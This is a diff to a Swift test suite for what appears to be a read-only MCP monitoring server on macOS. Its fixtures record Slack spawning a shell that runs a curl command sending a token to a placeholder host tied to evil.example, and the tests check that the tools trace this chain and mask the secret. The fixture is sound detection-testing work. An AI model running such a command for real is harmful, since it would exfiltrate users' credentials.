@@ -62,6 +62,27 @@ import Testing
                        DomainRecord(domain: "slack.com", firstSeen: now.addingTimeInterval(-90_000), lastSeen: now, count: 40,
                                     programs: ["Slack"], hosts: ["app.slack.com"], baseline: true)]
         try enc.encode(domains).write(to: dir.appendingPathComponent("domains.json"))
+        // Minute process lists for the last 70 minutes: Slack all along; its sh (pid 200) for minutes 60…55 ago.
+        let lists = ProcessHistory(directory: history)
+        var writer = ProcessHistory.WriterState()
+        func proc(_ pid: Int, _ ppid: Int, _ name: String, _ path: String, _ args: String, startMinutesAgo: Double,
+                  cpu: Double, mem: Int64, written: Int64) -> RunningProcessInfo {
+            RunningProcessInfo(pid: pid, ppid: ppid, start: now.addingTimeInterval(-startMinutesAgo * 60).timeIntervalSince1970,
+                               uid: 501, user: "alex", name: name, path: path, args: args, cpu: nil, cpuTime: cpu, mem: mem,
+                               threads: 4, written: written)
+        }
+        for minute in stride(from: 70, through: 0, by: -1) {
+            let t = now.addingTimeInterval(-Double(minute) * 60)
+            var list = [proc(100, 1, "Slack", "/Applications/Slack.app/Contents/MacOS/Slack", "", startMinutesAgo: 120,
+                             cpu: 100 + Double(70 - minute), mem: 300_000_000 + Int64(70 - minute) * 1_000_000,
+                             written: Int64(70 - minute) * 2_000_000)]
+            if minute <= 60 && minute >= 55 {
+                list.append(proc(200, 100, "sh", "/bin/sh", "sh -c 'curl https://h/x?token=abc123'", startMinutesAgo: 60,
+                                 cpu: Double(60 - minute) * 0.5, mem: 2_000_000, written: 0))
+            }
+            let day = MetricsArchive.dayName(t)
+            lists.archive.append(line: ProcessHistory.line(for: list, at: t.timeIntervalSince1970, day: day, state: &writer), day: day)
+        }
         self.dir = dir
         server = MCPServer(data: MCPDataSource(support: dir, history: history), version: "test", now: { now })
     }
@@ -96,8 +117,12 @@ import Testing
         let list = try #require(server.handle(#"{"jsonrpc":"2.0","id":2,"method":"tools/list"}"#))
         let tools = try #require((try JSONSerialization.jsonObject(with: Data(list.utf8)) as? [String: Any])?["result"] as? [String: Any])
         let defs = try #require(tools["tools"] as? [[String: Any]])
-        #expect(defs.count == 8)
+        #expect(defs.count == 10)
         #expect(defs.allSatisfy { (($0["annotations"] as? [String: Any])?["readOnlyHint"] as? Bool) == true })
+        // Everything a client loads into its context up front stays small: instructions and the tool list.
+        print("MCP context: instructions \(MCPServer.instructions.count) chars, tool list \(list.utf8.count) bytes")
+        #expect(MCPServer.instructions.count <= 800)
+        #expect(list.utf8.count <= 9_000)
     }
 
     @Test func protocolErrors() throws {
@@ -139,6 +164,50 @@ import Testing
         #expect(tree.contains("↑ 100  /Applications/Slack.app"))
         #expect(!tree.contains("/usr/bin/true"))            // pid 200 reused later: not an ancestor
         #expect(tree.contains("evil.example"))              // its connection
+    }
+
+    /// A history file that was just started (compressed, no finished block yet) is the newest: the search must look
+    /// past it, not stop there.
+    @Test func aJustStartedHistoryFileDoesNotHideOlderOnes() throws {
+        let history = dir.appendingPathComponent("History")
+        for ext in ["gz", "blocks"] {
+            FileManager.default.createFile(atPath: history.appendingPathComponent("activity-20270115-090000-000.jsonl.\(ext)").path,
+                                           contents: Data())
+        }
+        let found = try call("search_events", ["query": "curl", "since": "2h"])
+        #expect(found.text.contains("evil.example"))
+        #expect(try call("find_processes", ["query": "curl", "since": "2h"]).text.contains("300  curl"))
+    }
+
+    @Test func findProcessesInARange() throws {
+        let all = try call("find_processes", ["since": "2h"])
+        #expect(!all.isError)
+        #expect(all.text.contains("100  Slack (alex, parent 1)") && all.text.contains("still running"))
+        #expect(all.text.contains("200  sh") && all.text.contains("last seen"))
+        // curl lived under a minute: only its recorded start.
+        #expect(all.text.contains("300  curl") && all.text.contains("not in a minute list"))
+        #expect(!all.text.contains("abc123"))                              // secrets masked
+        let curl = try call("find_processes", ["query": "curl", "since": "2h"])
+        #expect(curl.text.contains("300  curl") && !curl.text.contains("100  Slack"))
+        let byPid = try call("find_processes", ["query": "100", "since": "2h"])
+        #expect(byPid.text.contains("100  Slack") && !byPid.text.contains("300  curl"))
+        let earlier = try call("find_processes", ["since": "2h", "until": "65m"])
+        #expect(earlier.text.contains("100  Slack") && !earlier.text.contains("200  sh"))
+    }
+
+    @Test func traceAProcessAndItsTree() throws {
+        let sh = try call("trace_process", ["pid": 200, "at": "58m"])           // the first pid 200: Slack's shell
+        #expect(!sh.isError)
+        #expect(sh.text.contains("Started by: 100 Slack"))
+        #expect(sh.text.contains("Children: 1") && sh.text.contains("↳ 300 curl"))
+        #expect(sh.text.contains("hosts: evil.example"))                     // its child's connection
+        #expect(sh.text.contains("Resources (") && sh.text.contains("minute lists"))
+        #expect(!sh.text.contains("abc123"))
+        let alone = try call("trace_process", ["pid": 200, "at": "58m", "children": false])
+        #expect(!alone.text.contains("evil.example"))
+        let reused = try call("trace_process", ["pid": 200])                    // the latest pid 200: /usr/bin/true
+        #expect(reused.text.contains("/usr/bin/true") && !reused.text.contains("↳ 300 curl"))
+        #expect(try call("trace_process", ["pid": 99999]).isError)
     }
 
     @Test func overviewAndSigning() throws {
